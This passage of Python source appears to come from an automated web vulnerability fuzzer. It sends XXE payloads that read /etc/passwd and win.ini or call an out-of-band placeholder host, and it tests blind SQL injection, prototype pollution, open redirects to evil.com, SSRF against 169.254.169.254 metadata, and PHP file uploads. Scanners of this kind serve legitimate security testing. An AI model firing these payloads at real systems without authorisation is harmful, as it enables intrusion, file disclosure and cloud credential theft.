                    resp = http_request("GET", self.target_url, headers=headers,
                                      timeout=self.timeout, verify=False)
                    self.stats["requests_sent"] += 1
                    if resp:
                        diff = self.diff_analyzer.analyze_diff(resp)
                        if diff["significant_diff"]:
                            self.findings.append({
                                "type": "header_injection",
                                "header": header,
                                "value": value,
                                "risk_level": "medium",
                                "detail": f"Header注入: {header}={value} 导致响应差异",
                                "diff_score": diff["diff_score"],
                            })
                except Exception:
                    pass

    def _fuzz_http_methods(self):
        methods = ["OPTIONS", "PUT", "DELETE", "PATCH", "TRACE", "CONNECT", "PROPFIND", "PROPPATCH"]
        for method in methods:
            try:
                resp = http_request(method, self.target_url, timeout=self.timeout, verify=False)
                self.stats["requests_sent"] += 1
                if resp and resp.get("status_code") in (200, 201, 204, 207):
                    if method in ("PUT", "DELETE", "PATCH"):
                        self.findings.append({
                            "type": "dangerous_http_method",
                            "method": method,
                            "status_code": resp.get("status_code"),
                            "risk_level": "high",
                            "detail": f"危险HTTP方法: {method} 可用 (状态码: {resp.get('status_code')})",
                        })
                    elif method == "TRACE":
                        self.findings.append({
                            "type": "http_trace_enabled",
                            "method": method,
                            "risk_level": "medium",
                            "detail": "HTTP TRACE方法已启用，可能导致XST攻击",
                        })
            except Exception:
                pass

    def _fuzz_content_type(self):
        payloads = [
            ("application/xml", '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'),
            ("application/json", '{"__proto__":{"isAdmin":true}}'),
            ("application/x-www-form-urlencoded", "name=test&__proto__[isAdmin]=true"),
            ("text/xml", '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>'),
        ]
        for content_type, body in payloads:
            try:
                resp = http_request("POST", self.target_url, data=body,
                                  headers={"Content-Type": content_type},
                                  timeout=self.timeout, verify=False)
                self.stats["requests_sent"] += 1
                if resp:
                    resp_body = str(resp.get("text", ""))
                    if "xxe" in content_type and "root:" in resp_body:
                        self.findings.append({
                            "type": "xxe",
                            "risk_level": "critical",
                            "detail": "XXE外部实体注入漏洞",
                        })
                    if "proto" in body and resp.get("status_code") == 200:
                        self.findings.append({
                            "type": "prototype_pollution",
                            "risk_level": "high",
                            "detail": "可能存在原型链污染漏洞",
                        })
            except Exception:
                pass

    def _fuzz_blind_sqli(self, params: List[str]):
        boolean_pairs = [
            ("1 AND 1=1", "1 AND 1=2"),
            ("1' AND '1'='1", "1' AND '1'='2"),
            ("1\" AND \"1\"=\"1", "1\" AND \"1\"=\"2"),
            ("1 AND 1=1--", "1 AND 1=2--"),
            ("1' AND '1'='1' --", "1' AND '1'='2' --"),
        ]
        for param in params[:10]:
            for true_payload, false_payload in boolean_pairs:
                try:
                    resp_true = http_request("GET",
                        f"{self.target_url}?{param}={quote(true_payload)}",
                        timeout=self.timeout, verify=False)
                    resp_false = http_request("GET",
                        f"{self.target_url}?{param}={quote(false_payload)}",
                        timeout=self.timeout, verify=False)
                    self.stats["requests_sent"] += 2

                    if resp_true and resp_false:
                        len_true = len(str(resp_true.get("text", "")))
                        len_false = len(str(resp_false.get("text", "")))
                        if abs(len_true - len_false) > 50:
                            self.findings.append({
                                "type": "sql_injection",
                                "subtype": "boolean_blind",
                                "param": param,
                                "true_payload": true_payload,
                                "false_payload": false_payload,
                                "len_diff": abs(len_true - len_false),
                                "risk_level": "critical",
                                "detail": f"SQL注入(布尔盲注): 参数 [{param}] 条件响应差异 {abs(len_true - len_false)} 字节",
                            })
                except Exception:
                    pass

    def _fuzz_xxe(self, params: List[str]):
        xxe_payloads = [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://COLLABORATOR"> %xxe;]>',
        ]
        for param in params[:5]:
            for payload in xxe_payloads:
                try:
                    resp = http_request("POST", self.target_url,
                                      data=payload,
                                      headers={"Content-Type": "application/xml"},
                                      timeout=self.timeout, verify=False)
                    self.stats["requests_sent"] += 1
                    if resp:
                        body = str(resp.get("text", ""))
                        if "root:" in body or "[fonts]" in body.lower():
                            self.findings.append({
                                "type": "xxe",
                                "param": param,
                                "risk_level": "critical",
                                "detail": f"XXE漏洞: 可读取系统文件",
                            })
                except Exception:
                    pass

    def _fuzz_open_redirect(self, params: List[str]):
        redirect_params = [p for p in params if p in ("url", "redirect", "next", "return", "goto", "target", "ref")]
        if not redirect_params:
            redirect_params = params[:3]

        redirect_payloads = [
            "https://evil.com",
            "//evil.com",
            "https:evil.com",
            "\\\\evil.com",
            "https://evil.com%40localhost",
            "https://evil.com#localhost",
            "javascript:alert(1)",
            "data:text/html,<script>alert(1)</script>",
        ]
        for param in redirect_params:
            for payload in redirect_payloads:
                try:
                    resp = http_request("GET",
                        f"{self.target_url}?{param}={quote(payload)}",
                        timeout=self.timeout, verify=False, allow_redirects=False)
                    self.stats["requests_sent"] += 1
                    if resp:
                        location = resp.get("headers", {}).get("location", "")
                        if location and ("evil.com" in location or "javascript:" in location):
                            self.findings.append({
                                "type": "open_redirect",
                                "param": param,
                                "payload": payload,
                                "location": location,
                                "risk_level": "medium",
                                "detail": f"开放重定向: 参数 [{param}] 可重定向到 {location[:80]}",
                            })
                except Exception:
                    pass

    def _fuzz_ssrf_params(self, params: List[str]):
        ssrf_params = [p for p in params if p in ("url", "path", "file", "src", "link", "proxy", "api")]
        if not ssrf_params:
            ssrf_params = params[:3]

        ssrf_payloads = [
            "http://127.0.0.1:80",
            "http://localhost:80",
            "http://0.0.0.0:80",
            "http://169.254.169.254/latest/meta-data/",
            "http://[::1]:80",
            "http://0177.0.0.1:80",
            "http://0x7f000001:80",
        ]
        for param in ssrf_params:
            for payload in ssrf_payloads:
                try:
                    resp = http_request("GET",
                        f"{self.target_url}?{param}={quote(payload)}",
                        timeout=self.timeout, verify=False)
                    self.stats["requests_sent"] += 1
                    if resp:
                        diff = self.diff_analyzer.analyze_diff(resp)
                        if diff["significant_diff"]:
                            self.findings.append({
                                "type": "ssrf",
                                "param": param,
                                "payload": payload,
                                "risk_level": "high",
                                "detail": f"SSRF: 参数 [{param}] 可请求内网地址",
                                "diff_score": diff["diff_score"],
                            })
                except Exception:
                    pass

    def _fuzz_file_upload(self, params: List[str]):
        upload_endpoints = [ep for ep in self.param_discoverer.discovered_endpoints
                          if any(kw in ep.lower() for kw in ("upload", "file", "import"))]
        if not upload_endpoints:
            return

        for endpoint in list(upload_endpoints)[:3]:
            try:
                boundary = "----WyqYanBoundary"
                body = (
                    f"--{boundary}\r\n"
                    f'Content-Disposition: form-data; name="file"; filename="test.php"\r\n'
                    f"Content-Type: application/x-php\r\n\r\n"
                    f"<?php phpinfo(); ?>\r\n"
                    f"--{boundary}--\r\n"
                )
                resp = http_request("POST", endpoint,
                                  data=body,
                                  headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
                                  timeout=self.timeout, verify=False)
                self.stats["requests_sent"] += 1
                if resp and resp.get("status_code") == 200:
                    self.findings.append({
                        "type": "file_upload",
                        "endpoint": endpoint,
                        "risk_level": "high",
                        "detail": f"文件上传端点: {endpoint} 接受PHP文件",
                    })
            except Exception:
                pass


def smart_fuzz(target_url: str, timeout: int = 10, waf_name: str = "generic",
               mode: str = "deep") -> Dict:
    fuzzer = SmartFuzzer(target_url, timeout=timeout, waf_name=waf_name, mode=mode)
    return fuzzer.smart_fuzz()
